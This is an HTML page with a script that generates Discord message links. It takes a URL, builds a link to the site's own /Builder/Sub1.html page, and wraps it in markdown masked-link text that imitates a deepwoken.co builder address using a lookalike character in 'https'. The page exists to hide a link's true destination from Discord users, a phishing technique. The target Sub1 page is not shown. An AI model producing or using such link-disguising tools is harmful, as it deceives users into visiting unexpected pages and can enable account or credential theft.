<html lang="en">
<head>
    <meta charset="UTF-8">

    <title>Main Page</title>
    <style>
        /* Reset and basic styling */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: url('https://media.istockphoto.com/id/513921039/photo/illustration-of-a-oool-yellow-smiley-with-sunglasses.jpg?s=612x612&w=0&k=20&c=hhVQxXTUhmcZLv2QrZ2WE2p7inzxQIA5H6XP8jPrQXw=') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
        }

        /* Container for form */
        .container {
            background: rgba(0, 0, 0, 0.75);
            padding: 20px 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        /* Header Styling */
        h1 {
            margin-bottom: 20px;
            font-size: 2em;
            color: #ffd700;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        /* Label and Input Styling */
        label {
            font-size: 1.2em;
            color: #ffd700;
            margin-bottom: 10px;
            display: block;
        }

        input[type="url"] {
            width: 100%;
            padding: 10px;
            border: 2px solid #ffd700;
            border-radius: 5px;
            margin-top: 10px;
            margin-bottom: 20px;
            background-color: #333;
            color: #fff;
            font-size: 1em;
        }

        /* Button Styling */
        button {
            background-color: #ffd700;
            color: #333;
            border: none;
            padding: 10px 20px;
            font-size: 1em;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #ffa500;
        }

        /* Link Display Styling */
        .link-display {
            margin-top: 20px;
            color: #ffd700;
            font-size: 1.2em;
        }

        .link-display a {
            color: #ffa500;
            text-decoration: underline;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Enter a Link</h1>
        <form id="linkForm">
            <label for="userInput">Your URL:</label>
            <input type="url" id="userInput" name="inputText" placeholder="https://example.com" required>
            <button type="submit">Generate message</button>
        </form>
        <div id="linkOutput" class="link-display"></div>
    </div>

    <script>
        // Function to generate a random 8-character alphanumeric string
        function generateRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        document.getElementById("linkForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form submission

            const inputText = document.getElementById("userInput").value;
            const linkOutput = document.getElementById("linkOutput");

            if (inputText) {
                // Generate the unique 8-character string
                const randomString = generateRandomString(8);

                // Create the link to Sub1.html with the entered URL and random string as parameters
                const linkToSub1 = `${window.location.origin}/Builder/Sub1.html?inputText=${encodeURIComponent(inputText)}&id=${randomString}`;

                // Display the link for the user to copy
                linkOutput.innerHTML = `Copy and paste this link into your discord message: <br><a href="[á¸§ttps://deepwoken.co/builder?id=${randomString}] (${linkToSub1})" target="_blank">${linkToSub1}</a>`;
            } else {
                linkOutput.textContent = "Please enter a valid URL.";
            }
        });
    </script>
</body>
</html>
